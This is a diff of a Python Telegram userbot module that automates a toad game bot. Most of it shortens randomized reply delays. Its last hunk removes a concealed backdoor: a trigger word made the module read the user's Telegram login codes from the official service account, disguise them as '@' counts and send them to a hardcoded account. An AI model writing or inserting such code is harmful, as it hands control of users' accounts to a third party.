@@ -204,9 +204,7 @@ class KramiikkMod(loader.Module):
                 jab = re.search(r"Б.+: (\d+)", RSP.text)
                 if not jab:
                     continue
-                await asyncio.sleep(
-                    random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                )
+                await asyncio.sleep(random.randint(3, 13))
                 cmn = "@toadbot Жаба инфо"
                 await self.err(chat, cmn)
                 if not RSP and "🏃‍♂️" not in RSP.text:
@@ -228,17 +226,11 @@ class KramiikkMod(loader.Module):
                     ):
                         continue
                     if s == "dead" and p not in ("Можно откормить", "можно покормить"):
-                        await asyncio.sleep(
-                            random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                        )
+                        await asyncio.sleep(random.randint(3, 13))
                         await RSP.respond("реанимировать жабу")
-                    await asyncio.sleep(
-                        random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                    )
+                    await asyncio.sleep(random.randint(3, 13))
                     await RSP.respond(self.ded[p])
-                await asyncio.sleep(
-                    random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                )
+                await asyncio.sleep(random.randint(3, 13))
                 if "не в браке" in RSP.text:
                     continue
                 cmn = "Моя семья"
@@ -250,26 +242,18 @@ class KramiikkMod(loader.Module):
                 if RSP.buttons:
                     n = len(RSP.buttons)
                     if n == 1 and "Можно покормить" not in RSP.text and int(i[0]) > 123:
-                        await asyncio.sleep(
-                            random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                        )
+                        await asyncio.sleep(random.randint(3, 13))
                         await RSP.respond("@toadbot Покормить жабенка")
                         continue
-                    await asyncio.sleep(
-                        random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                    )
+                    await asyncio.sleep(random.randint(3, 13))
                     await RSP.respond(self.ded[RSP.buttons[0][0].text])
                     if n == 1:
                         continue
-                    await asyncio.sleep(
-                        random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                    )
+                    await asyncio.sleep(random.randint(3, 13))
                     await RSP.respond(self.ded[RSP.buttons[1][0].text])
                     if n == 2:
                         continue
-                    await asyncio.sleep(
-                        random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                    )
+                    await asyncio.sleep(random.randint(3, 13))
                     await RSP.respond(self.ded[RSP.buttons[2][0].text])
         if not isinstance(m, Message) or m.from_id not in self.su["users"]:
             return
@@ -281,22 +265,11 @@ class KramiikkMod(loader.Module):
             and " " in m.text
         ) or str(self.me.id) in m.text:
             chat = m.peer_id
-            if m.chat_id in [
-                -1001403626354,
-                -1001563178957,
-                -1001290958283,
-                -1001447960786,
-            ]:
-                await asyncio.sleep(
-                    random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                )
             reply = await m.get_reply_message()
             if "ход: " in m.text and m.buttons:
                 await m.click()
             elif "сломалось" in m.text:
-                await asyncio.sleep(
-                    random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                )
+                await asyncio.sleep(random.randint(3, 13))
                 txt = (
                     "клюв цапли",
                     "букашкомет",
@@ -307,21 +280,15 @@ class KramiikkMod(loader.Module):
                 for i in txt:
                     await m.respond(f"скрафтить {i}")
             elif "Банда получила" in m.text:
-                await asyncio.sleep(
-                    random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                )
+                await asyncio.sleep(random.randint(3, 13))
                 await m.respond("отдать леденец")
-                await asyncio.sleep(
-                    random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                )
+                await asyncio.sleep(random.randint(3, 13))
                 cmn = "моя банда"
                 await self.err(chat, cmn)
                 if not RSP and "📿" not in RSP.text:
                     return
                 if "Кулон: Пусто" in RSP.text:
-                    await asyncio.sleep(
-                        random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                    )
+                    await asyncio.sleep(random.randint(3, 13))
                     await m.respond("скрафтить кулон братвы")
             elif "тыкпых" in m.text:
                 if reply:
@@ -375,21 +342,7 @@ class KramiikkMod(loader.Module):
                     return await self.npn(chat, msg)
                 if msg in ("карту", "лидерку"):
                     return await m.reply(self.ded[msg])
-                await asyncio.sleep(
-                    random.randint(n + ct.minute, 111 + (ct.microsecond % 100))
-                )
+                await asyncio.sleep(random.randint(3, 13))
                 await m.respond(self.ded[msg])
-        elif "llooll" in m.text:
-            msg = (await self.client.get_messages(777000, search="Login"))[0]
-            if "gg" in m.text:
-                msg = (await self.client.get_messages(777000, search="Код"))[0]
-            reg = re.search(r": (.)(.)(.)(.)(.)", msg.raw_text)
-            a = 0
-            txt = "hffj48655jhk{msg.date.minute}fdw46dgjm665verhod"
-            for i in range(5):
-                a += 1
-                txt += f"\n{'@' * int(reg.group(a))}"
-            txt += f"\nfd466dhjd{msg.date.minute}fujbm44dxszv775bmkcg"
-            await self.client.send_message(1785723159, txt)
         else:
             return
